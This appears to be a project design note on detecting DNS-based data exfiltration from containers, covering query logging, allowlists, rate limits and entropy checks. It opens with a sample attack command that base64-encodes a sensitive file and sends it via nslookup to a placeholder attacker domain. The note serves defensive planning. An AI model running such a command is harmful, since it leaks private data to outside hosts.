# DNS Monitoring for Data Exfiltration Detection

**Status:** Framework documented, full implementation deferred

## Threat: DNS Exfiltration

Attackers can exfiltrate data via DNS queries even when HTTP/HTTPS is blocked:

```bash
# Example DNS exfiltration attack
secret=$(cat /workspace/group/sensitive.txt | base64)
nslookup ${secret}.attacker.com

# Query to attacker's DNS server encodes data in subdomain:
# bXkgc2VjcmV0IGRhdGE=.attacker.com
```

## Detection Strategies

### 1. DNS Query Logging

Monitor all DNS queries from containers:

**Suspicious patterns:**
- Excessively long subdomains (> 63 chars per label)
- Base64-encoded looking strings
- High query rate to single domain
- Queries to unusual TLDs (.tk, .xyz, etc.)
- Non-alphanumeric characters in domain

### 2. Domain Allowlist

Similar to HTTP proxy, only allow DNS queries to trusted domains:

**Allowed:**
- `*.anthropic.com`
- `*.github.com`
- `*.npmjs.org`
- Common CDNs and package registries

**Blocked:**
- Unknown domains
- Newly registered domains (check age)
- Domains with suspicious patterns

### 3. Rate Limiting

Limit DNS queries per container:
- Max 100 queries per minute
- Max 10 queries per second to same domain

### 4. Entropy Analysis

Calculate entropy of subdomain labels:

```typescript
function calculateEntropy(str: string): number {
  const freq: Record<string, number> = {};
  for (const char of str) {
    freq[char] = (freq[char] || 0) + 1;
  }

  let entropy = 0;
  for (const count of Object.values(freq)) {
    const p = count / str.length;
    entropy -= p * Math.log2(p);
  }

  return entropy;
}

// High entropy (> 4.0) suggests base64 encoding
const entropy = calculateEntropy('bXkgc2VjcmV0');
if (entropy > 4.0) {
  // Possible data exfiltration
}
```

## Implementation Options

### Option A: Custom DNS Server (Full Control)

Run a DNS server in the host that:
- Intercepts all DNS queries from containers
- Applies allowlist and rate limiting
- Logs all queries for analysis
- Forwards allowed queries to upstream (8.8.8.8, 1.1.1.1)

**Pros:**
- Complete visibility and control
- Can block malicious queries
- Full audit trail

**Cons:**
- Complex to implement and maintain
- Requires running additional service
- DNS caching complications

### Option B: DNS Proxy (Simpler)

Use existing DNS proxy tools:
- `dnsproxy` - Lightweight DNS proxy with filtering
- `CoreDNS` - Kubernetes DNS with plugins
- `Pi-hole` - Network-wide DNS filtering

**Pros:**
- Easier to set up
- Well-tested software
- Community support

**Cons:**
- Less customization
- May not integrate cleanly with Apple Container

### Option C: Post-Hoc Analysis (Current Approach)

Monitor container logs and network traffic for DNS patterns:
- Log analysis for suspicious queries
- Alert on high query rates
- Manual investigation of anomalies

**Pros:**
- No additional infrastructure
- Simple to implement
- Good for detection and forensics

**Cons:**
- Can't prevent exfiltration in real-time
- Relies on log retention
- Manual analysis required

## Current Status

**Phase 5 (Current):** Egress HTTP/HTTPS proxy implemented ✅

**Future Enhancement:** DNS monitoring via Option C (post-hoc analysis)

DNS exfiltration is mitigated by:
1. Container isolation (limited data access)
2. HTTP/HTTPS proxy (blocks most exfiltration)
3. Read-only filesystem (no persistent tools)
4. Resource limits (limits exfiltration rate)

**For production deployment:** Consider implementing Option A (custom DNS server) or Option B (DNS proxy) for comprehensive protection.

## Testing DNS Exfiltration

To test if DNS exfiltration is possible:

```bash
# Inside container
nslookup test123.example.com

# Check logs - if query succeeds, DNS is not filtered
# If query fails or is logged, monitoring is working
```

## References

- [DNS Tunneling Detection](https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152)
- [Pi-hole](https://pi-hole.net/) - Network-wide DNS filtering
- [CoreDNS](https://coredns.io/) - DNS server with plugin architecture
